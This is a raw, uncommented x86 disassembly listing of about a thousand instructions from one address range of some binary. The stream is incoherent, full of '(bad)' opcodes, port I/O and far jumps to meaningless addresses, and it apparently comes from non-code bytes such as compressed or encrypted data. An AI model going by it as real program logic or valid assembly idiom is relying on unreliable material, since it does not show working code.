  416989:	adc    esi,DWORD PTR [ecx]
  41698b:	aaa    
  41698c:	in     al,0x1f
  41698e:	ja     0x41697e
  416990:	ja     0x41698c
  416992:	dec    ebx
  416993:	sbb    edx,DWORD PTR [edi]
  416995:	cld    
  416996:	sbb    al,0x47
  416998:	inc    esp
  416999:	and    esi,ecx
  41699b:	or     edx,DWORD PTR [edi]
  41699d:	pushf  
  41699e:	in     al,dx
  41699f:	adc    DWORD PTR [ebx-0x21c5886a],0xffffffee
  4169a6:	xor    bl,BYTE PTR [ebx]
  4169a8:	push   es
  4169a9:	mov    ds:0x6a5a60cb,eax
  4169ae:	inc    esi
  4169af:	(bad)  
  4169b0:	mov    ds:0x4363534c,eax
  4169b5:	inc    ecx
  4169b6:	push   cs
  4169b7:	fwait
  4169b8:	out    0xbb,eax
  4169ba:	xor    eax,DWORD PTR [esi-0x5be29597]
  4169c0:	gs add eax,0xf8f7c821
  4169c6:	mov    dl,0xd0
  4169c8:	fsubr  QWORD PTR [esi+0x35]
  4169cb:	pop    ecx
  4169cc:	sbb    eax,0x2236c042
  4169d1:	push   esp
  4169d2:	lods   al,BYTE PTR ds:[esi]
  4169d3:	xchg   edx,eax
  4169d4:	sbb    al,0x8d
  4169d6:	icebp  
  4169d7:	in     al,dx
  4169d8:	ins    DWORD PTR es:[edi],dx
  4169d9:	inc    ecx
  4169da:	jmp    0xafdd2578
  4169df:	lods   al,BYTE PTR ds:[esi]
  4169e0:	add    ebp,esp
  4169e2:	push   esi
  4169e3:	push   ecx
  4169e5:	mov    bh,0x1d
  4169e7:	mov    esp,0xc491565
  4169ec:	xor    DWORD PTR [edx],eax
  4169ee:	repz jbe 0x4169a3
  4169f1:	jo     0x416a01
  4169f3:	retf   0x2ff0
  4169f6:	out    dx,eax
  4169f7:	call   0x828d:0x94f817e7
  4169fe:	inc    BYTE PTR [eax-0x65]
  416a01:	pushf  
  416a02:	jl     0x416a70
  416a04:	test   BYTE PTR [ecx+eiz*8],bl
  416a07:	push   ss
  416a08:	and    al,0xf0
  416a0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a0b:	push   ss
  416a0c:	pop    ss
  416a0d:	addr16 lahf 
  416a0f:	retf   0x79d2
  416a12:	adc    DWORD PTR [edi-0x7d9d9c4a],edx
  416a18:	mov    al,0xf5
  416a1a:	xor    BYTE PTR [edx+0x1cd39c29],bl
  416a20:	mov    edx,0xd18dde7e
  416a25:	push   eax
  416a26:	js     0x4169f8
  416a28:	cmp    BYTE PTR [ebp+ebx*2+0x29],ch
  416a2c:	fadd   QWORD PTR [esi+0x43a00c0b]
  416a32:	or     ebx,DWORD PTR [edx-0x34]
  416a35:	aas    
  416a36:	push   ds
  416a37:	popf   
  416a38:	arpl   WORD PTR [ebx+ebx*1],cx
  416a3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a3c:	into   
  416a3d:	dec    edi
  416a3e:	sbb    ebp,ecx
  416a40:	sbb    edi,DWORD PTR [edi]
  416a42:	dec    ecx
  416a43:	add    DWORD PTR [edi+0xb],edi
  416a46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a47:	jmp    0x4169d2
  416a49:	jmp    0x416a50
  416a4b:	inc    edi
  416a4c:	sti    
  416a4d:	out    0x68,al
  416a4f:	xchg   edx,eax
  416a50:	push   eax
  416a51:	dec    eax
  416a52:	mov    ebx,0x8e0c623f
  416a57:	arpl   WORD PTR [edi],di
  416a59:	popa   
  416a5a:	mov    bh,BYTE PTR [ebx+0x4b]
  416a5d:	div    cl
  416a5f:	dec    ebx
  416a60:	dec    esi
  416a61:	mov    ebp,0x138cfa5a
  416a66:	add    DWORD PTR [esi],0xffffffda
  416a69:	ret    
  416a6a:	test   eax,0x711dfaf9
  416a6f:	rcl    BYTE PTR [edx],0x29
  416a72:	(bad)  
  416a73:	mov    esi,DWORD PTR ds:0x8b008a71
  416a79:	mov    ebx,0xc25247a
  416a7e:	adc    esi,0x3e
  416a81:	cdq    
  416a82:	popf   
  416a83:	pop    ebp
  416a84:	iret   
  416a85:	rol    BYTE PTR gs:[ebx+0x43],cl
  416a89:	push   edi
  416a8a:	push   cs
  416a8b:	cs sbb dl,bh
  416a8e:	mov    ebp,0x400d9121
  416a93:	jl     0x416a41
  416a95:	inc    eax
  416a96:	outs   dx,BYTE PTR ds:[esi]
  416a97:	adc    BYTE PTR [esi],ch
  416a99:	cs pop edi
  416a9b:	aam    0xd9
  416a9d:	test   al,0x7c
  416a9f:	adc    DWORD PTR ds:[esi+0x7],eax
  416aa3:	mov    ecx,DWORD PTR [ecx+0x142cf852]
  416aa9:	fisttp DWORD PTR [ebx]
  416aab:	xor    edx,DWORD PTR [ecx-0x6e07980d]
  416ab1:	cmp    DWORD PTR [edx+0x0],esi
  416ab4:	(bad)  
  416ab5:	jns    0x416a82
  416ab7:	sub    ch,cl
  416ab9:	xor    eax,0x6079251d
  416abe:	mov    al,0x21
  416ac0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ac1:	inc    esp
  416ac2:	sub    al,0x4f
  416ac4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ac5:	xchg   DWORD PTR [bx+si],esi
  416ac8:	xchg   BYTE PTR [bx+di+0x24],cl
  416acc:	adc    eax,0xf2ba026
  416ad1:	pop    ss
  416ad2:	dec    edx
  416ad3:	dec    esi
  416ad4:	mov    esp,0x32f489ef
  416ad9:	daa    
  416ada:	jg     0x416ace
  416adc:	lock frstor [edi-0x6eac7d6d]
  416ae3:	outs   dx,BYTE PTR ds:[esi]
  416ae4:	out    dx,al
  416ae5:	xchg   edi,eax
  416ae6:	mov    bh,0x2f
  416ae8:	retf   
  416ae9:	icebp  
  416aea:	ret    0xb744
  416aed:	(bad)  
  416aef:	push   esp
  416af0:	xchg   dl,ch
  416af2:	leave  
  416af3:	in     al,dx
  416af4:	loop   0x416aaa
  416af6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416af7:	sbb    ch,ah
  416af9:	jbe    0x416ae6
  416afb:	jo     0x416ae4
  416afd:	in     al,dx
  416afe:	cwde   
  416aff:	fadd   st,st(0)
  416b01:	push   ecx
  416b02:	addr16 repz iret 
  416b05:	mov    dh,0xec
  416b07:	repnz cmp bl,bl
  416b0a:	add    DWORD PTR [ebx],0x937409b8
  416b10:	sar    ah,1
  416b12:	les    ebp,FWORD PTR [ebx]
  416b14:	out    dx,al
  416b15:	jle    0x416b04
  416b17:	or     DWORD PTR [ebp-0x3c602e0],ebx
  416b1d:	xor    ah,bh
  416b1f:	sbb    DWORD PTR [edx],edi
  416b21:	inc    ecx
  416b22:	or     DWORD PTR [ebp+0x3c],edi
  416b25:	adc    ch,0xd9
  416b28:	aam    0x3d
  416b2a:	or     ebx,DWORD PTR [eax]
  416b2c:	pop    ds
  416b2d:	enter  0x31f8,0x29
  416b31:	(bad)  
  416b32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b33:	out    0xba,al
  416b35:	inc    eax
  416b36:	mov    ah,0xe6
  416b38:	loope  0x416ac2
  416b3a:	pop    ds
  416b3b:	cmp    dh,BYTE PTR [ebp-0x36]
  416b3e:	in     eax,0x83
  416b40:	leave  
  416b41:	mov    BYTE PTR ss:[edx],0x2d
  416b45:	clc    
  416b46:	push   eax
  416b47:	rol    BYTE PTR [edx+0x1f],1
  416b4a:	rol    bl,0x87
  416b4d:	scas   eax,DWORD PTR es:[edi]
  416b4e:	inc    edx
  416b4f:	cdq    
  416b50:	mov    bl,0x37
  416b52:	ins    DWORD PTR es:[edi],dx
  416b53:	jne    0x416b50
  416b55:	imul   edi,DWORD PTR [ebp-0x79],0x4c
  416b59:	shl    ch,0x72
  416b5c:	sub    eax,0xf77fcf7a
  416b61:	jge    0x416b29
  416b63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b64:	(bad)  
  416b65:	push   eax
  416b66:	or     BYTE PTR [edx-0x2768a7d6],al
  416b6c:	mov    ds:0xd6caf70d,al
  416b71:	aas    
  416b72:	mov    ecx,0x50c5e6aa
  416b77:	adc    al,0xb4
  416b79:	shl    DWORD PTR [edx-0xf],cl
  416b7c:	or     ebp,eax
  416b7e:	dec    ecx
  416b7f:	inc    eax
  416b80:	in     eax,0xf0
  416b82:	std    
  416b83:	retf   0xb596
  416b86:	(bad)  
  416b87:	push   ds
  416b88:	div    DWORD PTR [eax-0x744df260]
  416b8e:	sbb    ch,BYTE PTR [di-0x746b]
  416b93:	inc    esi
  416b94:	test   BYTE PTR [esi+0x6498323],0xfc
  416b9b:	jle    0x416b59
  416b9d:	repz loope 0x416bcc
  416ba0:	xchg   cl,dh
  416ba2:	mov    edi,0x7909a7fc
  416ba7:	out    dx,al
  416ba8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ba9:	jns    0x416c25
  416bab:	aaa    
  416bac:	loop   0x416b7a
  416bae:	mov    ecx,0xeca40251
  416bb3:	mov    DWORD PTR [ebx],esp
  416bb5:	(bad)  
  416bb6:	jg     0x416b3d
  416bb8:	pop    edx
  416bb9:	pop    eax
  416bba:	adc    ebp,edi
  416bbc:	aad    0x16
  416bbe:	adc    DWORD PTR [edx+0x1],esi
  416bc1:	je     0x416b7e
  416bc3:	add    BYTE PTR [edi+0x7d],bh
  416bc6:	sub    DWORD PTR [edi+0x47],ecx
  416bc9:	iret   
  416bca:	test   esi,edx
  416bcc:	jbe    0x416bee
  416bce:	xchg   esp,eax
  416bcf:	or     eax,DWORD PTR ds:0x6431bb4b
  416bd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416bd6:	bound  ecx,QWORD PTR [edi+0x3e09be85]
  416bdc:	xor    DWORD PTR [edx-0xa],ebp
  416bdf:	dec    esp
  416be0:	sub    ecx,esi
  416be2:	adc    ch,ch
  416be4:	mov    edx,0x77e87d82
  416be9:	in     al,dx
  416bea:	lods   al,BYTE PTR ds:[esi]
  416beb:	xchg   BYTE PTR ss:[eax],bh
  416bee:	push   eax
  416bef:	push   ecx
  416bf0:	test   eax,0x8cbada77
  416bf5:	rol    ch,1
  416bf7:	mov    bh,0x3f
  416bf9:	jnp    0x416bef
  416bfb:	dec    eax
  416bfc:	sbb    eax,0x23
  416bff:	adc    ch,dl
  416c01:	or     esp,DWORD PTR [ecx-0x3c]
  416c04:	cmp    dh,BYTE PTR [edx+eax*4-0x392dd1a9]
  416c0b:	push   ds
  416c0c:	lods   eax,DWORD PTR ds:[esi]
  416c0d:	xchg   ebp,eax
  416c0e:	jns    0x416ba7
  416c10:	xor    esi,DWORD PTR [ecx]
  416c12:	pop    ebp
  416c13:	les    edx,FWORD PTR [ebx-0xd]
  416c16:	cmc    
  416c17:	push   esp
  416c18:	cwde   
  416c19:	xchg   edx,eax
  416c1a:	adc    eax,0xde077bea
  416c1f:	inc    edx
  416c20:	xchg   DWORD PTR [eax],ecx
  416c22:	bnd jae 0x416bdf
  416c25:	pusha  
  416c26:	xchg   ecx,eax
  416c27:	inc    ebx
  416c28:	xchg   DWORD PTR [edi+ebx*2+0x25],edi
  416c2c:	rcl    DWORD PTR [eax-0x77],0xb4
  416c30:	mov    dl,0xe6
  416c32:	and    al,BYTE PTR [edi+0x40acf082]
  416c38:	mov    eax,ds:0x4755b595
  416c3d:	jl     0x416c4f
  416c3f:	cli    
  416c40:	cmp    ax,0x7098
  416c44:	sub    ebx,DWORD PTR [eax+0x5481a00e]
  416c4a:	dec    esp
  416c4b:	mov    ds,WORD PTR ds:0x65f78d1
  416c51:	xchg   edi,eax
  416c52:	clc    
  416c53:	add    DWORD PTR [eax+0x75e27c24],esp
  416c59:	repnz adc ebp,DWORD PTR [edi+0x4f657c33]
  416c60:	aaa    
  416c61:	idiv   BYTE PTR [bx+di-0x503d]
  416c66:	mov    al,ds:0x611c3ad4
  416c6b:	push   0xc50512d2
  416c70:	(bad)  
  416c71:	aam    0x5b
  416c73:	and    eax,0xe58f5488
  416c78:	adc    eax,0xe62e58d8
  416c7e:	mov    ah,0x78
  416c80:	pop    edi
  416c81:	xor    DWORD PTR [edx-0x32676077],0x1dd31f29
  416c8b:	(bad)  
  416c8c:	lods   eax,DWORD PTR ds:[esi]
  416c8d:	adc    ch,bl
  416c8f:	mov    eax,ds:0xd7253a0e
  416c94:	shl    BYTE PTR [esi],1
  416c96:	pop    ecx
  416c97:	mov    eax,ds:0x18ae1066
  416c9c:	push   eax
  416c9d:	ins    BYTE PTR es:[edi],dx
  416c9e:	dec    ebx
  416c9f:	data16 (bad) 
  416ca1:	in     eax,0xa1
  416ca3:	retf   0xd727
  416ca6:	xor    al,0xf2
  416ca8:	nop
  416ca9:	xchg   ecx,eax
  416caa:	pusha  
  416cab:	nop
  416cac:	dec    ebx
  416cad:	xor    DWORD PTR ds:0x78c887b9,esp
  416cb3:	inc    ebx
  416cb4:	pop    edx
  416cb5:	sbb    al,0x4e
  416cb7:	dec    edi
  416cb8:	pop    ebx
  416cb9:	sbb    eax,0x105ce033
  416cbe:	mov    edx,0xf90f42b4
  416cc3:	xchg   edi,eax
  416cc4:	inc    esi
  416cc5:	pushf  
  416cc6:	stc    
  416cc7:	imul   ebx,DWORD PTR [ebx-0x6],0xffffffa1
  416ccb:	sahf   
  416ccc:	data16 out dx,al
  416cce:	dec    eax
  416ccf:	mov    cl,BYTE PTR [eax+0x49]
  416cd2:	lds    ebp,FWORD PTR [edi-0x14]
  416cd5:	mov    esi,0x556f23ea
  416cda:	(bad)  
  416cdb:	iret   
  416cdc:	xor    ecx,DWORD PTR [edi]
  416cde:	repz or dl,dl
  416ce1:	mov    edi,0x7ce00c
  416ce6:	out    0x91,eax
  416ce8:	mov    bl,al
  416cea:	pop    esi
  416ceb:	sub    al,0xd7
  416ced:	(bad)  
  416cee:	sub    dh,BYTE PTR [ebx]
  416cf0:	and    eax,0x1b30ddb7
  416cf5:	and    DWORD PTR [edx],0x65
  416cf8:	sub    DWORD PTR [edi],0xe6ca9022
  416cfe:	(bad)  
  416cff:	add    esi,DWORD PTR [edi]
  416d01:	xor    BYTE PTR [ecx],bh
  416d03:	xchg   edi,eax
  416d04:	or     al,0x35
  416d06:	add    BYTE PTR [edi],bl
  416d08:	fs mov edi,0x71d2a03f
  416d0e:	jp     0x416d4f
  416d10:	cmp    al,0x1c
  416d12:	in     al,0xad
  416d14:	mov    ds:0x3a03fe9e,al
  416d19:	(bad)  
  416d1a:	sub    al,0xfd
  416d1c:	add    BYTE PTR [edx],cl
  416d1e:	js     0x416cec
  416d20:	sar    edi,0x16
  416d23:	xor    al,0x89
  416d25:	aaa    
  416d26:	fiadd  WORD PTR [edi+eax*8+0x13]
  416d2a:	sub    bl,BYTE PTR [esi-0xef1730b]
  416d30:	ja     0x416cb8
  416d32:	outs   dx,BYTE PTR ds:[esi]
  416d33:	ret    
  416d34:	pop    ecx
  416d35:	je     0x416d08
  416d37:	sbb    bh,BYTE PTR [ecx-0x26463e4e]
  416d3d:	jb     0x416ce6
  416d3f:	fimul  WORD PTR [esi+0x54]
  416d42:	retf   
  416d43:	shr    DWORD PTR ds:0x2d77fdc1,cl
  416d49:	retf   
  416d4a:	out    dx,al
  416d4b:	mov    ebp,0x8c92c6cf
  416d50:	sub    al,0x1
  416d52:	fwait
  416d53:	aam    0x13
  416d55:	cmp    DWORD PTR [ebp+0x57],0x6280b507
  416d5c:	mov    WORD PTR [edi],?
  416d5e:	out    dx,al
  416d5f:	mov    BYTE PTR [edi-0x2d0dfbf9],ah
  416d65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d66:	pop    eax
  416d67:	loopne 0x416cfd
  416d69:	sahf   
  416d6a:	xchg   esp,eax
  416d6b:	jae    0x416d1f
  416d6d:	xchg   esi,eax
  416d6e:	mov    al,0x91
  416d70:	or     BYTE PTR [edi+0x3f],0xa2
  416d74:	dec    eax
  416d75:	sbb    DWORD PTR [edi-0x684104b1],esi
  416d7b:	into   
  416d7c:	cmc    
  416d7d:	call   0x76e4:0xcdffe45e
  416d84:	mov    al,0x32
  416d86:	loop   0x416e05
  416d88:	int    0xca
  416d8a:	jmp    0x7037:0xc072884b
  416d91:	push   ebp
  416d92:	sbb    DWORD PTR [edi-0x77],edi
  416d95:	mov    ecx,0xa85e0b5b
  416d9a:	ja     0x416da9
  416d9c:	jb     0x416de4
  416d9e:	test   eax,0x9d4fee69
  416da3:	fs adc al,0x95
  416da6:	xchg   ebx,eax
  416da7:	(bad)  
  416da8:	fstp   TBYTE PTR [edx+0x62c1f4c9]
  416dae:	das    
  416daf:	adc    ch,BYTE PTR [edx-0x2770989]
  416db5:	dec    ecx
  416db6:	jae    0x416d96
  416db8:	lods   al,BYTE PTR ds:[esi]
  416db9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416dba:	icebp  
  416dbb:	dec    esp
  416dbc:	dec    ebx
  416dbd:	push   cs
  416dbe:	test   BYTE PTR [eax-0x53da9d7c],0xfb
  416dc5:	iret   
  416dc6:	or     dl,0xba
  416dc9:	arpl   si,di
  416dcb:	push   edi
  416dcc:	adc    edi,DWORD PTR ds:0x6dccf401
  416dd2:	mov    al,0x37
  416dd4:	imul   ebx,ecx,0xffffffdd
  416dd7:	mov    ecx,ebx
  416dd9:	es into 
  416ddb:	jnp    0x416e45
  416ddd:	scas   eax,DWORD PTR es:[edi]
  416dde:	cmc    
  416ddf:	jo     0x416e3d
  416de1:	sub    BYTE PTR [edx-0x31279860],0xeb
  416de8:	pop    ebp
  416de9:	xchg   ebp,eax
  416dea:	imul   esi,DWORD PTR [ecx-0x6e],0xc
  416dee:	jbe    0x416e08
  416df0:	les    eax,FWORD PTR [ebp-0x15761f2]
  416df6:	mov    esi,ecx
  416df8:	rcl    DWORD PTR [eax-0x44],0x5b
  416dfc:	outs   dx,BYTE PTR ds:[esi]
  416dfd:	(bad)  
  416dfe:	dec    ebx
  416dff:	xchg   ebp,eax
  416e00:	and    ah,BYTE PTR [ecx]
  416e02:	pop    edi
  416e03:	dec    esi
  416e04:	or     BYTE PTR [ebp+0x57],bl
  416e07:	xchg   BYTE PTR [ecx-0x2f239b37],dl
  416e0d:	fnstenv [esi]
  416e0f:	lods   al,BYTE PTR ds:[esi]
  416e10:	pop    ebx
  416e11:	mov    al,ds:0xab782623
  416e16:	idiv   edi
  416e18:	mov    fs,WORD PTR ds:0xb524a598
  416e1e:	hlt    
  416e1f:	push   edx
  416e20:	cmp    eax,0x6f0e0165
  416e25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e26:	inc    ebx
  416e27:	or     eax,DWORD PTR [ebx-0xc]
  416e2a:	out    dx,al
  416e2b:	sub    BYTE PTR [esi],ah
  416e2d:	out    0x9c,eax
  416e2f:	adc    ah,cl
  416e31:	(bad)  
  416e32:	cdq    
  416e33:	mov    al,ds:0x87a51735
  416e38:	shl    BYTE PTR [esi],cl
  416e3a:	fldenv [eax-0x48]
  416e3d:	sbb    DWORD PTR [ebx],0x993b5dc2
  416e43:	cli    
  416e44:	push   edi
  416e45:	and    eax,0x6e67c7d8
  416e4a:	adc    al,BYTE PTR [ecx-0x118e8325]
  416e50:	push   eax
  416e51:	pushf  
  416e52:	adc    BYTE PTR [ebp+0x1],dh
  416e55:	or     al,0xe3
  416e57:	aad    0x4a
  416e59:	fcomp  DWORD PTR [ebx+edi*4+0x1832ed62]
  416e60:	nop
  416e61:	mov    edi,0x92e2c5f6
  416e66:	stos   BYTE PTR es:[edi],al
  416e67:	stc    
  416e68:	and    BYTE PTR [edi+edx*2],bl
  416e6b:	fnstsw WORD PTR [ecx+0x59127313]
  416e71:	rcl    DWORD PTR [edx+esi*4],1
  416e74:	out    dx,al
  416e75:	jb     0x416e45
  416e77:	cmc    
  416e78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e79:	pop    esp
  416e7a:	xor    eax,0x665e22c5
  416e7f:	add    edi,DWORD PTR [eax]
  416e81:	pop    ebp
  416e82:	cmp    BYTE PTR [ebp-0xcdd340b],dh
  416e88:	xchg   edx,eax
  416e89:	cmp    bl,bh
  416e8b:	pop    eax
  416e8c:	mov    al,ds:0x62f7ea21
  416e91:	call   0xac6baeee
  416e96:	mov    esi,DWORD PTR [edx+0x2e828483]
  416e9c:	les    ebp,FWORD PTR [eax]
  416e9e:	clc    
  416e9f:	xlat   BYTE PTR ds:[ebx]
  416ea0:	jnp    0x416ed1
  416ea2:	mov    ecx,0x2d6ba98b
  416ea7:	sub    al,0xac
  416ea9:	cwde   
  416eaa:	adc    ebp,esi
  416eac:	and    al,0xa8
  416eae:	mov    ecx,0x1c7a4ce4
  416eb3:	mov    ah,0x3e
  416eb5:	sub    BYTE PTR [edi-0x4f],0x69
  416eb9:	scas   eax,DWORD PTR es:[edi]
  416eba:	scas   eax,DWORD PTR es:[edi]
  416ebb:	pusha  
  416ebc:	pop    eax
  416ebd:	mov    ecx,0x11c3667c
  416ec2:	dec    edi
  416ec3:	gs out 0x9a,eax
  416ec6:	out    dx,al
  416ec7:	mov    edi,0xe9979e3d
  416ecc:	data16 (bad) 
  416ece:	icebp  
  416ecf:	mov    ah,0xf1
  416ed1:	mov    dh,0x45
  416ed3:	jg     0x416f2c
  416ed5:	arpl   WORD PTR [esi+0x43566aa3],bp
  416edb:	jne    0x416efa
  416edd:	test   al,0xd4
  416edf:	test   eax,0x71d2ea16
  416ee4:	sub    DWORD PTR [eax+edx*1-0x2645ed00],ebp
  416eeb:	mov    al,ds:0x512db739
  416ef0:	into   
  416ef1:	cdq    
  416ef2:	xchg   ebp,eax
  416ef3:	cmp    DWORD PTR ds:0x2ecfbae0,ecx
  416ef9:	sbb    DWORD PTR [edi],eax
  416efb:	inc    eax
  416efc:	xchg   edx,eax
  416efd:	sbb    eax,0x29e26c5b
  416f02:	jns    0x416ea3
  416f04:	les    edi,FWORD PTR [eax-0x62]
  416f07:	jnp    0x416f79
  416f09:	(bad)  
  416f0a:	repz sti 
  416f0c:	hlt    
  416f0d:	add    DWORD PTR [eax+0x2ed01e68],ebx
  416f13:	sbb    al,0xf3
  416f15:	imul   ebp,eax,0x488bc9f6
  416f1b:	pop    ebp
  416f1c:	retf   
  416f1d:	mov    esi,0x77f0e319
  416f22:	jge    0x416f29
  416f24:	sbb    esp,DWORD PTR [esi-0x2c17bdd0]
  416f2a:	int3   
  416f2b:	je     0x416ee1
  416f2d:	aad    0x6b
  416f2f:	ret    
  416f30:	inc    esp
  416f31:	(bad)  
  416f33:	mov    eax,0xff075e1f
  416f38:	popa   
  416f39:	xor    ecx,DWORD PTR [eax+0x19]
  416f3c:	clc    
  416f3d:	xchg   edx,eax
  416f3e:	mov    bl,0x55
  416f40:	ret    
  416f41:	xor    DWORD PTR [ebx+0x0],esp
  416f44:	sub    eax,0xea601e88
  416f49:	xchg   ebp,eax
  416f4a:	scas   al,BYTE PTR es:[edi]
  416f4b:	call   0xc1b9:0x806ccec4
  416f52:	gs lock je 0x416ee9
  416f56:	xlat   BYTE PTR ds:[ebx]
  416f57:	scas   eax,DWORD PTR es:[edi]
  416f58:	pop    eax
  416f59:	aam    0xd0
  416f5b:	je     0x416f54
  416f5d:	or     DWORD PTR [esi+ecx*2],ebp
  416f60:	leave  
  416f61:	inc    edi
  416f62:	mov    ecx,0x731ea0a7
  416f67:	jl     0x416f81
  416f69:	sti    
  416f6a:	mov    ebp,0x10bef830
  416f6f:	xchg   esi,eax
  416f70:	lock aam 0xa9
  416f73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f74:	fbstp  TBYTE PTR [ecx-0x6c89a125]
  416f7a:	xchg   ecx,eax
  416f7b:	mov    ebx,DWORD PTR [ebx+0x73]
  416f7e:	pop    ebx
  416f7f:	fidivr WORD PTR [eax-0x785709b6]
  416f85:	ret    
  416f86:	xchg   edx,eax
  416f87:	ret    0xfb55
  416f8a:	es pop ds
  416f8c:	jg     0x416f5b
  416f8e:	out    dx,eax
  416f8f:	ficom  DWORD PTR [eax+0xd]
  416f92:	pop    es
  416f93:	xchg   ecx,eax
  416f94:	adc    eax,0x224f6036
  416f99:	xor    ebp,esi
  416f9b:	jge    0x416fc8
  416f9d:	or     BYTE PTR [edi-0xb100a8d],bl
  416fa3:	pop    eax
  416fa4:	lahf   
  416fa5:	mov    esp,0x9e07a234
  416faa:	adc    eax,0x18ce20e1
  416faf:	mov    al,0x88
  416fb1:	pop    ebp
  416fb2:	pushf  
  416fb3:	int3   
  416fb4:	or     eax,DWORD PTR [ebx]
  416fb6:	rol    DWORD PTR [ebx-0x52],0xa6
  416fba:	add    esi,DWORD PTR [ebx]
  416fbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416fbd:	or     DWORD PTR [ecx+edx*2],ecx
  416fc0:	inc    esp
  416fc1:	cmp    eax,0xa9f3db50
  416fc6:	dec    ecx
  416fc7:	pandn  mm0,mm5
  416fca:	scas   eax,DWORD PTR es:[edi]
  416fcb:	shl    BYTE PTR [ecx+0x11],cl
  416fce:	je     0x416fd0
  416fd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416fd1:	loop   0x416f55
  416fd3:	or     ebx,DWORD PTR [edi-0x12]
  416fd6:	adc    DWORD PTR [edx+0x659ced82],ecx
  416fdc:	add    BYTE PTR [ebp-0x7a0ef574],ch
  416fe2:	js     0x416fcd
  416fe4:	inc    edx
  416fe5:	mov    BYTE PTR [edx+0x7d],bl
  416fe8:	xlat   BYTE PTR ds:[ebx]
  416fe9:	inc    eax
  416fea:	dec    BYTE PTR [edx-0x6b3ecef2]
  416ff0:	push   ebx
  416ff1:	sbb    BYTE PTR [esi+0x3c32f8f1],bh
  416ff7:	mov    bh,0x4e
  416ff9:	push   cs
  416ffa:	dec    edx
  416ffb:	fwait
  416ffc:	and    eax,0xa01cc44
  417001:	mov    ?,WORD PTR fs:[eax+0x203c763b]
  417008:	add    eax,edx
  41700a:	test   eax,0x21264d7e
  41700f:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  417011:	xor    DWORD PTR [esi+0x2],ecx
  417014:	jnp    0x41706c
  417016:	(bad)  
  417017:	xor    al,0x89
  417019:	in     eax,0x5b
  41701b:	inc    ebp
  41701c:	fldlg2 
  41701e:	inc    esp
  41701f:	xor    ch,bl
  417021:	ficomp WORD PTR [eax-0x68]
  417024:	jno    0x416ffa
  417026:	lock mov esi,0xab91cf1f
  41702c:	and    eax,DWORD PTR ds:0x9743517
  417032:	and    BYTE PTR ds:0xdea9a405,al
  417038:	xor    BYTE PTR [edi+edi*2],al
  41703b:	pop    esi
  41703c:	jnp    0x416ffc
  41703e:	dec    ebx
  41703f:	cmc    
  417040:	stos   DWORD PTR es:[edi],eax
  417041:	dec    esp
  417042:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417043:	(bad)  
  417044:	std    
  417045:	leave  
  417046:	inc    ebx
  417047:	mov    dh,BYTE PTR [ebx+0x5d]
  41704a:	mov    eax,ds:0x57d9aac1
  41704f:	xchg   eax,ebx
  417051:	mov    ds,eax
  417053:	add    al,0x36
  417055:	int3   
  417056:	ss pop ecx
  417058:	mov    cl,0xa1
  41705a:	xchg   eax,ecx
  41705c:	pop    edx
  41705d:	div    DWORD PTR [ecx]
  41705f:	xchg   ecx,eax
  417060:	adc    al,0xcd
  417062:	shl    BYTE PTR [eax+0x4d240715],cl
  417068:	pop    edx
  417069:	nop
  41706a:	popf   
  41706b:	mov    ds:0xa7bf8e9,al
  417070:	mov    bh,0x14
  417072:	(bad)  
  417073:	jae    0x41703f
  417075:	xchg   esp,eax
  417076:	mov    edi,ecx
  417078:	ss popf 
  41707a:	xor    eax,0x790aa135
  41707f:	dec    edi
  417080:	test   DWORD PTR [ebx-0x32],ebp
  417083:	jl     0x4170de
  417085:	js     0x417069
  417087:	in     al,dx
  417088:	mov    edi,DWORD PTR [edi+0x16d7cc9c]
  41708e:	sub    esi,DWORD PTR [eax+0x5f]
  417091:	dec    esi
  417093:	pop    esi
  417094:	mov    dh,0xd8
  417096:	dec    esi
  417097:	(bad)  
  417099:	and    DWORD PTR [edx],edx
  41709b:	paddusb mm5,QWORD PTR [ecx-0x36]
  41709f:	push   esp
  4170a0:	push   ds
  4170a1:	(bad)  
  4170a2:	(bad)  
  4170a4:	cmpxchg BYTE PTR [ecx-0x32e45ea7],bl
  4170ab:	ret    0x99dc
  4170ae:	push   0xd719e3e6
  4170b3:	int    0xec
  4170b5:	aas    
  4170b6:	int    0x7b
  4170b8:	cld    
  4170b9:	test   al,0xab
  4170bb:	dec    esp
  4170bc:	inc    ebx
  4170bd:	jbe    0x41711c
  4170bf:	(bad)  gs:[ecx+0x78]
  4170c3:	mov    dl,0x9c
  4170c5:	sbb    DWORD PTR ds:0xf2877562,ebp
  4170cb:	or     bh,bh
  4170cd:	and    dl,BYTE PTR [eax+0x20bf07bf]
  4170d3:	es jo  0x41712d
  4170d6:	mov    ecx,0xaeccc48c
  4170db:	fisttp WORD PTR [edi]
  4170dd:	mov    ah,0xd5
  4170df:	sub    eax,0x22a5e193
  4170e4:	cmp    BYTE PTR ds:0x60d66fee,dh
  4170ea:	mov    dl,0xe8
  4170ec:	sar    DWORD PTR [ecx-0x6ccc95bf],0xd4
  4170f3:	cmp    eax,ebp
  4170f5:	hlt    
  4170f6:	xchg   ecx,eax
  4170f7:	loope  0x4170b1
  4170f9:	or     al,0x7
  4170fb:	sub    eax,0x310c0d23
  417100:	dec    edx
  417101:	in     eax,dx
  417102:	aas    
  417103:	add    DWORD PTR [edi],ebp
  417105:	inc    edx
  417106:	fnsave [ebp-0x3fff032a]
  41710c:	jae    0x41716e
  41710e:	pop    edx
  41710f:	neg    esi
  417111:	sahf   
